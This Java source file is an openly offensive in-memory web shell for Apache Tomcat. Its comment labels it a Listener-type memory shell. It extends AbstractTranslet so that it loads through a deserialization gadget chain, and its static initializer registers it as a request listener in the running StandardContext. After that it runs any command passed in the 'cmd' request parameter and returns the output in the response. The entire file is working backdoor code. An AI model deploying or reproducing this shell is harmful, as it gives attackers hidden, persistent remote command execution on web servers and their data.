package com.threed.shell.tomcat;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;

import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.util.Scanner;

/**
 * @className: TomcatListenerInject
 * @description: Listener类型的内存马
 * @author: two_day
 * @date: 2022/5/27
 **/
public class TomcatListenerInject extends AbstractTranslet implements ServletRequestListener {

    static{
        try{
            StandardContext context = getStandardContext();
            if (context != null){
                context.addApplicationEventListener(new TomcatListenerInject());
            }
        } catch(Exception e){

        }
    }

    @Override
    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {
        HttpServletRequest servletRequest = (HttpServletRequest) servletRequestEvent.getServletRequest();
        try {
            Field requestField = servletRequest.getClass().getDeclaredField("request");
            requestField.setAccessible(true);
            //org.apache.catalina.connector.Request
            Object o = requestField.get(servletRequest);
            //org.apache.catalina.connector.Response  https://blog.slkun.me/2018/10/89.html
            HttpServletResponse response = (HttpServletResponse) o.getClass().getDeclaredMethod("getResponse").invoke(o);
            String cmd = servletRequest.getParameter("cmd");
            System.out.println(cmd);
            if (cmd != null && response != null){
                Process process = Runtime.getRuntime().exec(cmd);
                Scanner s = new Scanner(process.getInputStream()).useDelimiter("\\a");;
                String output = s.hasNext() ? s.next() : "";
                PrintWriter writer = response.getWriter();
                writer.write(output);
                writer.flush();
                writer.close();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void requestInitialized(ServletRequestEvent servletRequestEvent) {

    }

    private static StandardContext getStandardContext() {
        WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
        return (StandardContext) webappClassLoaderBase.getResources().getContext();

    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
